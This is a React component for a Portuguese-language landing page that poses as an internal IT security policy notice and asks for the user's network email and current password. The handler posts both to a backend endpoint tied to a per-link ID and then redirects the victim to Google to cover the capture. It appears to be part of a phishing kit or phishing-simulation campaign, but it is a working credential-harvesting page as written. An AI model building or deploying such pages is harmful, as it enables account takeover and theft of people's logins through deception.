import React, { useState } from 'react';
import './ti.css';

const TILanding = ({ linkId }) => {
  const [formData, setFormData] = useState({ email: '', password: '' });

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/landing/submit/${linkId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        window.location.href = 'https://www.google.com';
      } else {
        console.error('Erro ao enviar');
      }
    } catch (error) {
      console.error('Erro ao submeter:', error);
    }
  };

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  return (
    <div className="ti-container">
      <div className="ti-card">
        <h1>Política de Segurança de TI</h1>
        <p>Conforme nova diretriz interna, confirme seus dados de autenticação.</p>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            name="email"
            placeholder="Email de rede"
            value={formData.email}
            onChange={handleChange}
            required
          />
          <input
            type="password"
            name="password"
            placeholder="Senha atual"
            value={formData.password}
            onChange={handleChange}
            required
          />
          <button type="submit">Confirmar</button>
        </form>
      </div>
    </div>
  );
};

export default TILanding;
